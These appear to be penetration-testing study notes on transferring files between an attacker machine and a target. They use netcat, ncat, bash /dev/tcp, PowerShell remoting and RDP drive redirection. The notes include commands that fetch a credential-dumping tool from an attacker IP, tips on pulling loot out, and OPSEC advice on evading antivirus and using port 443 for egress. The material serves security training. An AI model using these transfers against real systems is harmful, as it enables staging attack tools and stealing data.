# Miscellaneous File Transfer Methods

## Overview

These methods are useful when standard transfers such as HTTP, HTTPS, SMB, or SCP are not available or are inconvenient.

Common use cases:

- pushing tools to a target
- pulling loot back to attacker
- working around firewall restrictions
- transferring files over existing remote access channels
- avoiding reliance on web servers

This page focuses on:

- Netcat / Ncat
- Bash `/dev/tcp`
- PowerShell Remoting
- RDP drive redirection

---

## Quick Workflow

1. identify which binaries / protocols are available
2. determine whether inbound or outbound connections are allowed
3. choose sender/listener direction accordingly
4. transfer file
5. verify file integrity if important

---

# 1. Netcat / Ncat

## Overview

Netcat (`nc`) and Ncat (`ncat`) can read from and write to TCP/UDP connections, making them very useful for simple file transfers.

Useful when:

- you need a fast ad-hoc transfer
- HTTP/SMB are unavailable
- you want to control listener direction
- firewall rules favor one connection direction over another

Ncat is the newer implementation from the Nmap project and adds features such as:

- SSL
- IPv6
- proxy support
- connection brokering

---

## Method 1: Target Listens, Attacker Sends

### Target using Netcat

```bash
nc -l -p 8000 > SharpKatz.exe
```

### Target using Ncat

```bash
ncat -l -p 8000 --recv-only > SharpKatz.exe
```

### Attacker sends with Netcat

```bash
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
```

### Attacker sends with Ncat

```bash
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe
```

### Notes

- `-l` = listen
- `-p` = port
- `-q 0` = quit immediately after EOF
- `--recv-only` = receive only, then exit
- `--send-only` = send only, then exit

---

## Method 2: Attacker Listens, Target Connects

Useful when **inbound access to target is blocked** but the target can make outbound connections.

### Attacker using Netcat

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

### Target connects with Netcat

```bash
nc 192.168.49.128 443 > SharpKatz.exe
```

### Attacker using Ncat

```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

### Target connects with Ncat

```bash
ncat 192.168.49.128 443 --recv-only > SharpKatz.exe
```

---

## Notes on Direction

| Scenario | Better Choice |
|---------|---------------|
| target accepts inbound connections | target listens |
| target cannot receive inbound but can make outbound | attacker listens |
| you need simplest raw transfer | netcat / ncat |
| you need cleaner end-of-transfer handling | ncat |

---

# 2. File Transfer with Bash `/dev/tcp`

## Overview

If `nc` or `ncat` is missing, Bash may still allow TCP reads via `/dev/tcp`.

Useful when:

- Bash is available
- Netcat is not installed
- target can connect outbound to attacker

---

## Attacker listens with Netcat

```bash
sudo nc -l -p 443 -q 0 < SharpKatz.exe
```

## Attacker listens with Ncat

```bash
sudo ncat -l -p 443 --send-only < SharpKatz.exe
```

## Target receives using `/dev/tcp`

```bash
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

Notes:

- Bash must support `/dev/tcp`
- very useful in minimal Linux environments

---

# 3. PowerShell Remoting File Transfer

## Overview

If HTTP, HTTPS, and SMB are unavailable, PowerShell Remoting (WinRM) can be used to transfer files.

By default:

| Protocol | Port |
|---------|------|
| WinRM HTTP | 5985 |
| WinRM HTTPS | 5986 |

Requirements usually include:

- administrative access on remote host
- membership in **Remote Management Users**
- or explicit permissions for PowerShell Remoting

---

## Confirm WinRM Access

```powershell
Test-NetConnection -ComputerName DATABASE01 -Port 5985
```

Example output:

```text
TcpTestSucceeded : True
```

---

## Create Remote Session

```powershell
$Session = New-PSSession -ComputerName DATABASE01
```

---

## Copy File to Remote Session

```powershell
Copy-Item -Path C:\samplefile.txt -ToSession $Session -Destination C:\Users\Administrator\Desktop\
```

---

## Copy File from Remote Session

```powershell
Copy-Item -Path "C:\Users\Administrator\Desktop\DATABASE.txt" -Destination C:\ -FromSession $Session
```

---

## Use Cases

PowerShell Remoting is useful when:

- you already have admin rights
- WinRM is enabled
- web transfer methods are restricted
- you want file transfer over an existing management channel

---

# 4. RDP File Transfer

## Overview

RDP can be used for file transfers through:

- clipboard copy/paste
- mounted local drives / folders

This is often one of the easiest transfer options when GUI access is available.

---

## Clipboard Transfer

If supported, you can:

- copy a file locally
- paste it into the RDP session
- or copy from target back to local system

⚠️ Clipboard redirection may be disabled or behave inconsistently depending on environment or client.

---

## Mount Local Folder with `rdesktop`

```bash
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

---

## Mount Local Folder with `xfreerdp`

```bash
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

---

## Access Mounted Folder in RDP Session

Inside the remote Windows session, browse to:

```text
\\tsclient\
```

This allows file transfer between:

- local Linux folder
- remote Windows host

---

## Native Windows RDP Client

From Windows, `mstsc.exe` can also redirect local drives into the RDP session.

Typical workflow:

1. open Remote Desktop Connection
2. go to local resources / drive sharing
3. select local drive or folder
4. connect
5. access redirected drive in remote session

---

## RDP Notes

- redirected drive is generally only visible in your RDP session
- other logged-in users typically cannot access it directly
- often cleaner than trying to stage files through web services

---

# When to Use What

| Method | Best For | Notes |
|--------|----------|------|
| Netcat / Ncat | raw fast transfer | very flexible |
| `/dev/tcp` | minimal Linux hosts | Bash-dependent |
| PowerShell Remoting | Windows admin access | good for managed environments |
| RDP drive redirection | GUI access | very convenient |
| clipboard copy/paste | quick manual transfers | may be disabled |

---

# Common OPSEC Notes

- raw Netcat transfers are unencrypted
- prefer encrypted channels when possible for sensitive data
- verify whether EDR/AV may flag transferred tooling
- use outbound-friendly methods if inbound access is blocked
- consider using common egress ports like 443 when appropriate
- clean up dropped tooling after use

---

# Cheatsheet

## Netcat / Ncat

```bash
# target listens
nc -l -p 8000 > file
ncat -l -p 8000 --recv-only > file
```

```bash
# attacker sends
nc -q 0 TARGET_IP 8000 < file
ncat --send-only TARGET_IP 8000 < file
```

```bash
# attacker listens
sudo nc -l -p 443 -q 0 < file
sudo ncat -l -p 443 --send-only < file
```

```bash
# target receives
nc ATTACKER_IP 443 > file
ncat ATTACKER_IP 443 --recv-only > file
```

## `/dev/tcp`

```bash
cat < /dev/tcp/ATTACKER_IP/443 > file
```

## PowerShell Remoting

```powershell
Test-NetConnection -ComputerName TARGET -Port 5985
$Session = New-PSSession -ComputerName TARGET
Copy-Item -Path C:\local.txt -ToSession $Session -Destination C:\Temp\
Copy-Item -Path "C:\Temp\remote.txt" -Destination C:\ -FromSession $Session
```

## RDP

```bash
rdesktop TARGET -d DOMAIN -u USER -p 'PASSWORD' -r disk:linux='/local/path'
```

```bash
xfreerdp /v:TARGET /d:DOMAIN /u:USER /p:'PASSWORD' /drive:linux,/local/path
```

```text
\\tsclient\
```

---

# Tags

#file-transfer #netcat #ncat #winrm #powershell #rdp #devtcp #pentest #ctf #oscp